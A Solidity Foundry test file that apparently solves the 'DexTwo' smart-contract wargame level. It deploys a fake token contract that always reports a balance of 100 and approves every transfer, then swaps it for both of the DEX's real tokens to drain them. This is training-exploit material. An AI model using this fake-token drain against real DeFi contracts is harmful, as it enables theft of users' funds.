pragma solidity 0.8.0;

import "src/levels/DexTwo/DexTwoFactory.sol";
import "src/levels/DexTwo/DexTwo.sol";
import "forge-std/Test.sol";

contract DexTwoAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    DexTwoFactory public factory;
    DexTwo public instance;
    
    function setUp() public {
        factory = new DexTwoFactory();
        instance = DexTwo(factory.createInstance(dummyPlayerAddress));
    }
    
    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)),dummyPlayerAddress), false);
    }
    
    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress);

        MaliciousTokenContract evilCoin = new MaliciousTokenContract();

        instance.swap(address(evilCoin), instance.token1(), 100);
        instance.swap(address(evilCoin), instance.token2(), 100);
  
        assertEq(factory.validateInstance(payable(address(instance)),dummyPlayerAddress), true);
    }
}

contract MaliciousTokenContract {
    function balanceOf(address) public pure returns (uint){
        return 100;
    }

    function transferFrom(address, address, uint) public pure returns(bool) {
        return true;
    }
}